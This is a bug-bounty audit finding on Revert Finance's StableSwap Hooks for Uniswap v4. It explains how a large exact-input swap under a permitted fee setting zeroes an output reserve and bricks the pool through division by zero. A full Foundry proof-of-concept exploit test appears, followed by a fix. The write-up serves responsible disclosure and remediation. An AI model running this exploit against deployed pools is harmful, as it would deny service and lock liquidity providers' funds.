# [MEDIUM] Exact-input swaps can zero output reserves and permanently brick pool math

```text
id         : W3-001
protocol   : Revert Finance — StableSwap Hooks (Uniswap v4 hook)
platform   : Cantina competition, finding #1280 (as huuduan)
severity   : medium  (likelihood: medium / impact: high)
class      : DoS / missing reserve floor check
status     : confirmed
reward     : 417.63
date       : 2026-05-08
commit     : revert-finance/stableswap-hooks @ cf0c30e576f144809df9819f4d3ad49e0b7fe2d7
```

Original submission: <https://cantina.xyz/code/e55ee7b9-6c99-42f8-8338-39f3dd134ef3/findings/1280>

## Summary

Exact-input swaps can reduce an output token reserve to zero under an accepted fee configuration. Once any reserve becomes zero, later invariant and proportional-liquidity math reverts due to division by zero, effectively bricking the pool.

## Root cause

In `Swap._swapExactInput`, the hook computes the target output reserve from invariant math:

```solidity
uint256 newTokenOutReserves = StableSwapMath.getTargetReserves(...);
uint256 rawAmountOut = StableSwapMath.descale(
    _ctx.scaledReserves[_ctx.tokenOutIndex] - newTokenOutReserves,
    _getRate(_ctx.tokenOutIndex)
);
```

It then calculates fees and settles the trade:

```solidity
reserves[_ctx.tokenInIndex] += _result.amountIn;
reserves[_ctx.tokenOutIndex] -= _result.amountOut + _result.hookFees + _result.protocolFees;
```

There is no post-swap reserve floor check. If `getTargetReserves` returns `0` and the fee configuration sends the whole gross LP fee to hook/protocol fees, the reserve decrease can equal the whole output reserve.

That fee configuration is allowed, because `setHookFeePercentage` and `setProtocolFeePercentage` only require their sum to be `<= FEE_PRECISION`. For example:

```solidity
lpFeePercentage = 300;
hookFeePercentage = FEE_PRECISION;
protocolFeePercentage = 0;
```

Here the net LP fee is zero, so a sufficiently large exact-input swap can consume the entire output reserve, leaving `reserves[tokenOut] == 0`.

## Attack path

1. A two-token pool is deployed and funded with balanced liquidity.
2. `hookFeePercentage` is set to `FEE_PRECISION` (accepted by the setter).
3. Anyone executes a very large exact-input swap.
4. The output reserve becomes exactly zero.
5. Every later swap reverts, because `StableSwapMath.getInvariant` divides by every scaled reserve:

   ```solidity
   invariantProduct = (invariantProduct * invariant) / _scaledReserves[j];
   ```

6. Subsequent non-initial liquidity additions also revert in `_calculateAddLiquidity`, because `reserves[i] == 0`:

   ```solidity
   uint256 proportion = Math.mulDiv(_amounts[i], currentTotalSupply, reserves[i]);
   ```

## Impact

A user can permanently brick a pool by performing a large exact-input swap under a valid fee configuration. Once one reserve is zero, future swaps and liquidity additions revert, preventing normal pool operation.

This is a denial-of-service against the affected pool. It requires no privileged access once the pool is deployed with the accepted fee configuration.

**Likelihood:** the issue requires a fee configuration where the net LP fee does not leave enough reserve dust behind, in particular when hook/protocol fees take 100% of gross LP fees. The current code allows this.

## Proof of concept

The key assertion:

```solidity
assertEq(hooks.reserves(outputIndex), 0, "exact-input swap leaves output reserve at zero");
```

<details>
<summary>Full Foundry test</summary>

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";

import {Base} from "src/Base.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {MockERC20} from "test/scenarios/mocks/MockERC20.sol";
import {ExternalContractsDeployer} from "test/testUtils/ExternalContractsDeployer.sol";
import {StableSwapHooksFactoryHarness} from "test/testUtils/StableSwapHooksFactoryHarness.sol";

/// @notice PoC: exact-input swap can leave the output reserve at zero and brick pool math.
contract ExactInputZeroReserveDoSPoC is ExternalContractsDeployer {
    uint256 internal constant LP_FEE_PERCENTAGE = 300;
    uint256 internal constant AMP = 100;
    uint256 internal constant INITIAL_LIQUIDITY = 1_000_000 ether;
    uint256 internal constant DRAINING_INPUT = 1_000_000_000_000_000_000 ether;

    StableSwapHooksFactoryHarness internal factory;
    StableSwapHooks internal hooks;
    MockERC20 internal tokenA;
    MockERC20 internal tokenB;

    address internal admin;
    address internal liquidityProvider;

    function setUp() public override {
        super.setUp();

        tokenA = new MockERC20("Token A", "TKNA", 18);
        tokenB = new MockERC20("Token B", "TKNB", 18);

        Currency tokenACurrency = Currency.wrap(address(tokenA));
        Currency tokenBCurrency = Currency.wrap(address(tokenB));
        (currency0, currency1) = Currency.unwrap(tokenACurrency) < Currency.unwrap(tokenBCurrency)
            ? (tokenACurrency, tokenBCurrency)
            : (tokenBCurrency, tokenACurrency);

        admin = makeAddr("admin");
        liquidityProvider = makeAddr("liquidityProvider");

        factory = new StableSwapHooksFactoryHarness(
            IPoolManager(poolManager),
            admin,
            makeAddr("protocolFeeCollector"),
            makeAddr("hookFeeCollector"),
            keccak256(type(StableSwapHooks).creationCode)
        );

        _deployHooks();

        uint256 feePrecision = hooks.FEE_PRECISION();
        vm.prank(admin);
        hooks.setHookFeePercentage(feePrecision);

        _addInitialLiquidity();
    }

    function test_poc_exactInputCanZeroOutputReserveAndBrickPoolMath() public {
        ExactInputSwapper swapper = new ExactInputSwapper(IPoolManager(poolManager), _getPoolKey());

        Currency inputCurrency = currency0;
        Currency outputCurrency = currency1;
        MockERC20 inputToken = MockERC20(Currency.unwrap(inputCurrency));

        inputToken.mint(address(swapper), DRAINING_INPUT);

        uint256 outputIndex = hooks.getCurrencyIndex(outputCurrency);
        assertEq(hooks.reserves(outputIndex), INITIAL_LIQUIDITY, "precondition: output reserve is funded");

        swapper.swapExactInput(true, DRAINING_INPUT);

        assertEq(hooks.reserves(outputIndex), 0, "exact-input swap leaves output reserve at zero");
        assertGt(hooks.hookFees(outputIndex), 0, "non-LP fee claim remains outside reserves");

        inputToken.mint(address(swapper), 1 ether);
        vm.expectRevert();
        swapper.swapExactInput(true, 1 ether);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1 ether;
        amounts[1] = 1 ether;

        _mintTo(liquidityProvider, currency0, 1 ether);
        _mintTo(liquidityProvider, currency1, 1 ether);

        vm.startPrank(liquidityProvider);
        IERC20(Currency.unwrap(currency0)).approve(address(hooks), type(uint256).max);
        IERC20(Currency.unwrap(currency1)).approve(address(hooks), type(uint256).max);
        vm.expectRevert();
        hooks.addLiquidity(amounts, new uint256[](2), 0);
        vm.stopPrank();
    }

    function _deployHooks() private {
        Currency[] memory currencies = new Currency[](2);
        currencies[0] = currency0;
        currencies[1] = currency1;

        Base.RateOracleConfig[] memory rateOracles = new Base.RateOracleConfig[](2);
        rateOracles[0] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});
        rateOracles[1] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});

        bytes memory code = type(StableSwapHooks).creationCode;
        (, bytes32 salt) = factory.mineSalt(currencies, rateOracles, LP_FEE_PERCENTAGE, AMP, code);

        hooks = StableSwapHooks(factory.deploy(currencies, rateOracles, LP_FEE_PERCENTAGE, AMP, salt, code));
    }

    function _addInitialLiquidity() private {
        _mintTo(liquidityProvider, currency0, INITIAL_LIQUIDITY);
        _mintTo(liquidityProvider, currency1, INITIAL_LIQUIDITY);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = INITIAL_LIQUIDITY;
        amounts[1] = INITIAL_LIQUIDITY;

        vm.startPrank(liquidityProvider);
        IERC20(Currency.unwrap(currency0)).approve(address(hooks), type(uint256).max);
        IERC20(Currency.unwrap(currency1)).approve(address(hooks), type(uint256).max);
        hooks.addLiquidity(amounts, new uint256[](2), 0);
        vm.stopPrank();
    }

    function _mintTo(address _to, Currency _currency, uint256 _amount) private {
        MockERC20(Currency.unwrap(_currency)).mint(_to, _amount);
    }

    function _getPoolKey() internal view returns (PoolKey memory) {
        return PoolKey({
            currency0: currency0,
            currency1: currency1,
            fee: uint24(LP_FEE_PERCENTAGE),
            tickSpacing: hooks.TICK_SPACING(),
            hooks: IHooks(address(hooks))
        });
    }
}

contract ExactInputSwapper is IUnlockCallback {
    using SafeERC20 for IERC20;

    IPoolManager private immutable poolManager;
    PoolKey private poolKey;

    uint256 public lastAmountOut;

    constructor(IPoolManager _poolManager, PoolKey memory _poolKey) {
        poolManager = _poolManager;
        poolKey = _poolKey;
    }

    function swapExactInput(bool _zeroForOne, uint256 _amountIn) external {
        poolManager.unlock(abi.encode(_zeroForOne, _amountIn));
    }

    function unlockCallback(bytes calldata _data) external override returns (bytes memory) {
        require(msg.sender == address(poolManager), "only pool manager");

        (bool zeroForOne, uint256 amountIn) = abi.decode(_data, (bool, uint256));

        BalanceDelta swapDelta = poolManager.swap(
            poolKey,
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(amountIn),
                sqrtPriceLimitX96: zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
            }),
            ""
        );

        Currency inputCurrency = zeroForOne ? poolKey.currency0 : poolKey.currency1;
        Currency outputCurrency = zeroForOne ? poolKey.currency1 : poolKey.currency0;
        int128 inputDelta = zeroForOne ? swapDelta.amount0() : swapDelta.amount1();
        int128 outputDelta = zeroForOne ? swapDelta.amount1() : swapDelta.amount0();

        require(inputDelta < 0 && outputDelta > 0, "unexpected delta");

        uint256 inputOwed = uint256(int256(-inputDelta));
        uint256 outputToTake = uint256(int256(outputDelta));

        poolManager.sync(inputCurrency);
        IERC20(Currency.unwrap(inputCurrency)).safeTransfer(address(poolManager), inputOwed);
        poolManager.settle();
        poolManager.take(outputCurrency, address(this), outputToTake);

        lastAmountOut = outputToTake;

        return "";
    }
}
```

</details>

## Fix

Add explicit reserve floor checks after swap calculation and before settlement.

For exact-input swaps, reject any trade that would leave the output reserve at zero in either raw or scaled terms:

```solidity
if (newTokenOutReserves == 0) revert InsufficientReserve();
```

Also check after raw conversion and fee accounting:

```solidity
uint256 reserveDecrease = result.amountOut + result.hookFees + result.protocolFees;
if (reserves[tokenOutIndex] <= reserveDecrease) revert InsufficientReserve();
```

Additionally, consider disallowing fee configurations where hook/protocol fees consume 100% of gross LP fees, or require a non-zero net LP fee / dust floor so exact-input swaps cannot fully drain a reserve.

## Timeline

- 2026-05-08 — submitted
- 2026-05-10 — last updated on Cantina
